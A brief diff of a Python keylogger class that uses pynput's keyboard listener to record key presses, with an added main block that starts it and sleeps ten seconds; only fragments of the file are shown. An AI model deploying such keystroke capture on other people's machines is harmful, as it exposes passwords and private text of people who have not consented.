@@ -1,7 +1,6 @@
 from pynput.keyboard import Listener, Key
 
 class keylog:
-
     def __init__(self) -> None:    
         self.keys = []
         self.listener = Listener(on_press = self.on_press)
@@ -34,4 +33,8 @@ class keylog:
     def stop(self):
         self.listener.stop()
         
+if __name__ == "__main__":
+    keylogger = keylog()
+    import time
+    time.sleep(10)      
 
